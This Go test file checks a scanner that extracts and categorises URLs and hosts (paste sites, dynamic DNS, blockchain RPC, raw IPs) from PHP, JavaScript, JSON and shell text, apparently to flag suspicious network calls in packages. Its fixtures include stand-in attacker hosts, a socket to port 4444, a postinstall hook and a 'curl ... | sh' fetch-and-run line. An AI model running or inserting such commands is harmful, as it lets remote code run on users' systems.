// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package analyze

import (
	"net/netip"
	"net/url"
	"strings"
	"testing"

	"github.com/RhythmShahriar/sightread/core"
)

func TestFindURLs(t *testing.T) {
	tests := []struct {
		in             string
		host, key, url string // "" host: nothing found
	}{
		{"see https://API.Evil-Host.ru:8443/a/b?q=1#f now", "api.evil-host.ru", "evil-host.ru", "https://api.evil-host.ru/a/b"},
		{"https://bücher.de/katalog", "xn--bcher-kva.de", "xn--bcher-kva.de", "https://xn--bcher-kva.de/katalog"},
		{"http://xn--bcher-kva.de", "xn--bcher-kva.de", "xn--bcher-kva.de", "http://xn--bcher-kva.de/"},
		{"http://[2001:db8::1]:8080/p", "2001:db8::1", "2001:db8::1", "http://[2001:db8::1]/p"},
		{"'http://45.12.1.9/x.php'", "45.12.1.9", "45.12.1.9", "http://45.12.1.9/x.php"},
		{"https://user:pass@files.evil.top/x", "files.evil.top", "evil.top", "https://files.evil.top/x"},
		{"https://a.b.shop.co.uk/", "a.b.shop.co.uk", "shop.co.uk", "https://a.b.shop.co.uk/"},
		{"https://abc.ngrok-free.app/x", "abc.ngrok-free.app", "abc.ngrok-free.app", "https://abc.ngrok-free.app/x"},
		{"git+https://github.com/o/r.git", "github.com", "github.com", "https://github.com/o/r.git"},
		{"(https://wordpress.org/plugins/x/).", "wordpress.org", "wordpress.org", "https://wordpress.org/plugins/x/"},
		{"http://localhost:8080/", "", "", ""},
		{"http://127.0.0.1/", "", "", ""},
		{"https://example.com/docs", "", "", ""},
		{"http://intranet.local/", "", "", ""},
		{"https://foo.notatld/", "", "", ""},
		{"file:///etc/passwd", "", "", ""},
		{"mailto:someone@evil-host.ru", "", "", ""},
		{"https://-bad-.com/", "", "", ""},
	}
	for _, tc := range tests {
		refs := findURLs(tc.in)
		if tc.host == "" {
			if len(refs) != 0 {
				t.Errorf("%q: found %+v, want none", tc.in, refs)
			}
			continue
		}
		if len(refs) != 1 {
			t.Errorf("%q: found %+v, want one", tc.in, refs)
			continue
		}
		r := refs[0]
		if r.host != tc.host || r.key != tc.key || r.url != tc.url {
			t.Errorf("%q: host %q key %q url %q, want %q %q %q", tc.in, r.host, r.key, r.url, tc.host, tc.key, tc.url)
		}
	}
}

func TestBareHost(t *testing.T) {
	tests := []struct {
		in     string
		strict bool
		host   string // "" for not a host
	}{
		{"evil-host.ru", true, "evil-host.ru"},
		{"c2.evil.top:4444", true, "c2.evil.top"},
		{"//cdn.jsdelivr.net/npm/x.js", true, "cdn.jsdelivr.net"},
		{"shop.co.uk", true, "shop.co.uk"},
		{"203.0.113.9:4444", true, "203.0.113.9"},
		{"2001:db8::7", true, "2001:db8::7"},
		{"203.0.113.9", false, "203.0.113.9"},
		{"user.name", false, "user.name"},
		{"readme.md", true, ""},
		{"user.name", true, ""},
		{"console.info", true, ""},
		{"1.2.3.4", true, ""},
		{"jquery.min.js", true, ""},
		{"setup.py", true, ""},
		{"evil-host.ru extra words", true, ""},
		{"localhost:8080", false, ""},
		{"evil.ru:http", true, ""},
	}
	for _, tc := range tests {
		r, ok := bareHost(tc.in, tc.strict)
		if (tc.host != "") != ok || (ok && r.host != tc.host) {
			t.Errorf("bareHost(%q, %v) = %q %v, want %q", tc.in, tc.strict, r.host, ok, tc.host)
		}
	}
}

func TestHostCategory(t *testing.T) {
	tests := map[string]string{
		"mainnet.infura.io":          catBlockchain,
		"cloudflare-eth.com":         catBlockchain,
		"api.etherscan.io":           catBlockchain,
		"rpc.ankr.com":               catBlockchain,
		"rpc.some-chain.org":         catBlockchain,
		"x.quiknode.pro":             catBlockchain,
		"ethereum.publicnode.com":    catBlockchain,
		"api.bscscan.com":            catBlockchain,
		"pastebin.com":               catPaste,
		"paste.ee":                   catPaste,
		"rentry.co":                  catPaste,
		"bit.ly":                     catShortener,
		"tinyurl.com":                catShortener,
		"t.co":                       catShortener,
		"is.gd":                      catShortener,
		"cutt.ly":                    catShortener,
		"evil.duckdns.org":           catDynDNS,
		"x.ddns.net":                 catDynDNS,
		"a1b2.ngrok-free.app":        catDynDNS,
		"x-y.trycloudflare.com":      catDynDNS,
		"raw.githubusercontent.com":  catRawGitHub,
		"gist.githubusercontent.com": catRawGitHub,
		"github.com":                 "",
		"wordpress.org":              "",
		"notbit.ly.example.net":      "",
		"myinfura.io":                "",
	}
	for h, want := range tests {
		if got := hostCategory(h); got != want {
			t.Errorf("hostCategory(%q) = %q, want %q", h, got, want)
		}
	}
}

func TestHostFeatures(t *testing.T) {
	tests := []struct {
		name, path, src string
		kind            core.FeatureKind
		key, ctx        string
		attrs           map[string]string
	}{
		{"php literal url", "x.php", `<?php wp_remote_get('https://api.evil-host.ru/v1/ping');`,
			core.FURL, "https://api.evil-host.ru/v1/ping", core.CtxCode, map[string]string{"domain": "evil-host.ru"}},
		{"built host after folding", "x.php", `<?php $h = 'ev' . 'il-host.ru'; wp_remote_get('https://' . $h . '/x');`,
			core.FDomain, "evil-host.ru", core.CtxCode, map[string]string{"host": "evil-host.ru"}},
		{"url in a comment", "x.php", "<?php\n// mirror: https://files.evil.top/p.zip\n$x = 1;",
			core.FDomain, "evil.top", core.CtxComment, nil},
		{"raw ip", "x.php", `<?php $u = 'http://45.12.1.9/x.php';`, core.FDomain, "45.12.1.9", core.CtxCode, map[string]string{"category": catRawIP}},
		{"socket host", "x.php", `<?php $s = fsockopen('203.0.113.9', 4444);`, core.FDomain, "203.0.113.9", core.CtxCode, map[string]string{"category": catRawIP}},
		{"blockchain rpc", "x.php", `<?php $r = wp_remote_post('https://mainnet.infura.io/v3/abc', $a);`,
			core.FDomain, "infura.io", core.CtxCode, map[string]string{"category": catBlockchain, "host": "mainnet.infura.io"}},
		{"interpolated url", "x.php", `<?php $u = "https://evil.top/{$path}";`, core.FDomain, "evil.top", core.CtxCode, nil},
		{"heredoc url", "x.php", "<?php\n$u = <<<EOT\nhello\nhttps://evil.top/a\nEOT;\n", core.FDomain, "evil.top", core.CtxCode, nil},
		{"js template fold", "x.js", "fetch(`https://${'c2'}.evil.top/x`);", core.FDomain, "evil.top", core.CtxCode, map[string]string{"host": "c2.evil.top"}},
		{"js bare literal", "x.js", `const h = 'c2.evil-host.ru';`, core.FDomain, "evil-host.ru", core.CtxCode, nil},
		{"js block comment", "x.js", "/* see https://docs.evil.top/x */\nrun();", core.FDomain, "evil.top", core.CtxComment, nil},
		{"vendored file", "vendor/a/b.js", `fetch('https://api.evil.top/');`, core.FDomain, "evil.top", core.CtxVendored, nil},
		{"punycode", "x.js", `fetch('https://bücher.de/');`, core.FDomain, "xn--bcher-kva.de", core.CtxCode, nil},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			l := langPHP
			if strings.HasSuffix(tc.path, ".js") {
				l = langJS
			}
			fs := codeFeatures(l, tc.path, []byte(tc.src), pathContext(tc.path))
			for _, f := range fs {
				if f.Kind == tc.kind && f.Key == tc.key && f.Context == tc.ctx {
					for k, v := range tc.attrs {
						if f.Attrs[k] != v {
							t.Errorf("attr %s = %q, want %q", k, f.Attrs[k], v)
						}
					}
					return
				}
			}
			t.Errorf("no %s:%s with context %s in %q", tc.kind, tc.key, tc.ctx, describeCtx(fs))
		})
	}
}

func describeCtx(fs []core.Feature) []string {
	var out []string
	for _, f := range fs {
		out = append(out, f.SetKey()+"@"+f.Context)
	}
	return out
}

func TestHostNegatives(t *testing.T) {
	tests := []struct{ name, path, src string }{
		{"loopback", "x.php", `<?php wp_remote_get('http://127.0.0.1:8080/');`},
		{"documentation domain", "x.php", `<?php $u = 'https://example.com/x';`},
		{"file names", "x.php", `<?php include 'readme.md'; $f = 'setup.py'; $j = 'jquery.min.js';`},
		{"property paths", "x.js", `get(obj, 'user.name'); log('console.info');`},
		{"version", "x.php", `<?php $v = '1.2.3.4';`},
		{"localhost", "x.js", `fetch('http://localhost:3000/api');`},
	}
	for _, tc := range tests {
		l := langPHP
		if strings.HasSuffix(tc.path, ".js") {
			l = langJS
		}
		for _, f := range codeFeatures(l, tc.path, []byte(tc.src), core.CtxCode) {
			if f.Kind == core.FDomain || f.Kind == core.FURL {
				t.Errorf("%s: unexpected %s", tc.name, f.SetKey())
			}
		}
	}
}

func TestDocAndJSONHosts(t *testing.T) {
	readme := "=== X ===\nContributors: me\n\nSee https://wordpress.org/plugins/x/ and www.example-shop.de for help.\n"
	fs := docFeatures("readme.txt", []byte(readme))
	want := map[string]int{"domain:wordpress.org": 4, "url:https://wordpress.org/plugins/x/": 4, "domain:example-shop.de": 4}
	for _, f := range fs {
		if l, ok := want[f.SetKey()]; ok {
			if f.Context != core.CtxDoc || f.Ev.Line != l {
				t.Errorf("%s context %q line %d", f.SetKey(), f.Context, f.Ev.Line)
			}
			delete(want, f.SetKey())
		}
	}
	if len(want) > 0 {
		t.Errorf("missing %v in %q", want, describeCtx(fs))
	}
	pkg := "{\n  \"name\": \"x\",\n  \"homepage\": \"https://github.com/o/x#readme\",\n  \"config\": {\"api\": \"api.evil-host.ru\"},\n  \"scripts\": {\"postinstall\": \"node i.js\"}\n}\n"
	fs = jsonFeatures("package.json", []byte(pkg), false)
	keys := map[string]int{}
	for _, f := range fs {
		keys[f.SetKey()] = f.Ev.Line
	}
	if keys["domain:github.com"] != 3 || keys["domain:evil-host.ru"] != 4 || keys["hook:npm:postinstall"] != 5 {
		t.Errorf("json features %v", keys)
	}
	if fs := jsonFeatures("composer.json", []byte(`{"support": {"docs": "https://docs.evil.top/"}}`), false); len(fs) != 2 {
		t.Errorf("composer.json features %q", describeCtx(fs))
	}
}

func TestShellHosts(t *testing.T) {
	fs := textFeatures(core.KindText, "package.json", []byte("curl -s https://payload.evil.top/i.sh | sh"))
	if !matchFeature(fs, core.FDomain, "evil.top", map[string]string{"host": "payload.evil.top"}) {
		t.Errorf("no domain in %q", describe(fs))
	}
}

func FuzzExtractURLs(f *testing.F) {
	for _, s := range []string{
		"https://API.Evil-Host.ru:8443/a/b?q=1#f",
		"https://bücher.de/katalog www.example-shop.de",
		"http://[2001:db8::1]:8080/p http://[::1]/",
		"https://user:pass@files.evil.top/x%zz",
		"git+https://github.com/o/r.git",
		"evil-host.ru",
		"//cdn.jsdelivr.net/npm/x.js",
		"2001:db8::7",
		"http://\xff\xfe.com/",
		"https://xn--.com/ https://xn--zz.com/ http://a..b/",
		"http://ｅｘａｍｐｌｅ.ｃｏｍ/",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		low := strings.ToLower(s)
		for _, r := range textHosts(s, true, true) {
			if r.raw == "" || !strings.Contains(low, strings.ToLower(r.raw)) {
				t.Errorf("host text %q not in input %q", r.raw, s)
			}
			in := r.raw
			if strings.Count(in, ":") >= 2 && !strings.HasPrefix(in, "[") {
				in = "[" + in + "]"
			}
			if h, _, _, ok := normHost(in); !ok || h != r.host {
				t.Errorf("host %q does not normalise to %q from %q", r.host, h, r.raw)
			}
			if r.url == "" {
				continue
			}
			u, err := url.Parse(r.url)
			if err != nil {
				t.Errorf("url %q does not parse: %v", r.url, err)
				continue
			}
			if u.Hostname() != r.host {
				t.Errorf("url %q has host %q, want %q", r.url, u.Hostname(), r.host)
			}
		}
	})
}

// TestLocalAddr: only localhost and addresses publicAddr rejects are
// local; hosts, public and private addresses and zoned ones are not.
func TestLocalAddr(t *testing.T) {
	for in, want := range map[string]string{
		"127.0.0.1": "127.0.0.1", "127.0.0.1:18905": "127.0.0.1", "tcp://[::1]:80": "::1", "http://user@localhost./x": "localhost",
		"https://[fe80::1]/p": "fe80::1", "0.0.0.0": "0.0.0.0", "udp://224.0.0.1:5353": "224.0.0.1",
		"evil.test": "", "10.0.0.1": "", "203.0.113.9:80": "", "fe80::1%eth0": "", "gopher://127.0.0.1/": "", "": "",
	} {
		got, ok := localAddr(in)
		if got != want || ok != (want != "") {
			t.Errorf("localAddr(%q) = %q %v, want %q", in, got, ok, want)
		}
	}
}

func FuzzLocalAddr(f *testing.F) {
	for _, s := range []string{"127.0.0.1:80", "tcp://[::1]:80", "http://localhost/x", "evil.test", "[", "a@b@[::1"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		if h, ok := localAddr(s); ok {
			if h != "localhost" {
				a, err := netip.ParseAddr(h)
				if err != nil || publicAddr(a) {
					t.Fatalf("localAddr(%q) = %q, not a local address", s, h)
				}
			}
		} else if h != "" {
			t.Fatalf("localAddr(%q) = %q without ok", s, h)
		}
	})
}
